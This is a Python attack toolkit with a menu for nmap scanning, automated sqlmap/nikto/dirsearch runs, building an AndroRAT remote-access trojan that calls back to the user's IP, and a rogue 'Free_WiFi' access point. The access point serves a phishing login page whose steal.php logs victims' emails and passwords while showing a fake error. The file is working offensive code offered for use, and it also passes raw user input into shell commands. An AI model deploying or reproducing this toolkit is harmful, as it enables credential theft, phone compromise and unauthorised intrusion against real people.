import os
import subprocess

def nmap_scan():
    target = input("Enter IP or domain to scan: ")
    scan_type = input("Enter scan type (full, stealth, vuln): ").strip().lower()

    if scan_type == "full":
        command = f"nmap -p- -A {target}"
    elif scan_type == "stealth":
        command = f"nmap -sS -T4 {target}"
    elif scan_type == "vuln":
        command = f"nmap --script=vuln {target}"
    else:
        print("Invalid scan type! Defaulting to full scan.")
        command = f"nmap -p- -A {target}"
    
    print(f"Running: {command}")
    os.system(command)

def bug_hunting():
    url = input("Enter URL to scan: ").strip()
    output_file = input("Enter output file (e.g., results.txt): ").strip()

    if not url.startswith("http"):
        print("Invalid URL. Make sure to include http:// or https://")
        return
    
    print(f"Starting bug hunting on {url}. Results will be saved in {output_file}")

    tools = {
        "SQL Injection (sqlmap)": f"sqlmap -u {url} --batch --level=5 --risk=3 --dbs",
        "Nikto (Web Vulnerabilities)": f"nikto -h {url} -o {output_file}",
        "Directory Bruteforce (dirsearch)": f"dirsearch -u {url} -e php,html,js -o {output_file}"
    }

    for tool, command in tools.items():
        print(f"\n[+] Running {tool}...")
        subprocess.run(command, shell=True)

def andro_rat():
    print("[+] Setting up AndroRAT...")
    ip = input("Enter your public IP (for reverse connection): ").strip()
    port = input("Enter port to listen on: ").strip()

    rat_command = f"python3 AndroRAT/main.py --build -i {ip} -p {port}"
    print(f"Generating AndroRAT APK with {rat_command}")
    os.system(rat_command)

    print("\n[+] To start listening for connections, run:")
    print(f"    python3 AndroRAT/main.py --start -p {port}")

def fake_wifi():
    print("[+] Setting up Fake WiFi Access Point...")

    ssid = "Free_WiFi"
    credentials_file = "credentials.txt"

    html_content = """
    <html>
    <body>
        <h2>Free WiFi Login</h2>
        <form action="steal.php" method="POST">
            Email: <input type="text" name="email"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    """
    php_content = f"""
    <?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    $file = fopen("{credentials_file}", "a");
    fwrite($file, "Email: " . $email . " | Password: " . $password . "\\n");
    fclose($file);
    echo "Sorry, the server is down. Try again later.";
    ?>
    """

    os.makedirs("/var/www/html/fake_wifi", exist_ok=True)
    with open("/var/www/html/fake_wifi/index.html", "w") as f:
        f.write(html_content)
    with open("/var/www/html/fake_wifi/steal.php", "w") as f:
        f.write(php_content)

    print("[+] Fake Login Page created at /var/www/html/fake_wifi")

    hostapd_conf = f"""
    interface=wlan0
    driver=nl80211
    ssid={ssid}
    hw_mode=g
    channel=6
    macaddr_acl=0
    auth_algs=1
    ignore_broadcast_ssid=0
    """
    
    with open("hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    print("[+] Starting Fake WiFi Access Point...")
    os.system("service apache2 start")
    os.system("hostapd hostapd.conf")

    print("\n[+] WiFi Access Point is active. Waiting for credentials...")
    print(f"Captured credentials will be saved in {credentials_file}")

def main():
    print("""
    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    """)

    print("[1] Advanced Nmap Port & IP Scanning")
    print("[2] Advanced Bug Hunting Program")
    print("[3] AndroRAT Setup & Deployment")
    print("[4] Fake WiFi Access Point (Credential Capture)")
    choice = input("Choose an option (1-4): ").strip()

    if choice == "1":
        nmap_scan()
    elif choice == "2":
        bug_hunting()
    elif choice == "3":
        andro_rat()
    elif choice == "4":
        fake_wifi()
    else:
        print("Invalid choice. Exiting...")

if __name__ == "__main__":
    main()
